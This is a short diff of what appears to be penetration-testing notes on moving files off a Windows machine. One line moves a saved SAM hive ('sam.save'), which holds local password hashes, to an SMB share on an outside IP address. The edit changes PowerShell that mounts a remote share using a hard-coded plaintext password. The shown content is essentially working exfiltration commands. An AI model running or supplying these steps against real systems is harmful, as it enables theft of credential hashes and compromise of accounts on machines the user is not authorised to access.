@@ -12,8 +12,8 @@ cmd /c "copy file.txt X:\"
 move sam.save \\10.10.15.16\CompData
 
 $pass = convertto-securestring 'staphy' -AsPlainText -Force
-$pass = convertto-securestring 'staphy' -AsPlainText -Force
-New-PSDrive -Name "staphy" -PSProvider "FileSystem" -Root "\\<IP>\Public"
+$creds = New-Object System.Management.Automation.PSCredential('staphy',$pass)
+New-PSDrive -Name "staphy" -PSProvider "FileSystem" -Credentials $creds -Root "\\<IP>\Public"
 ```
 
 
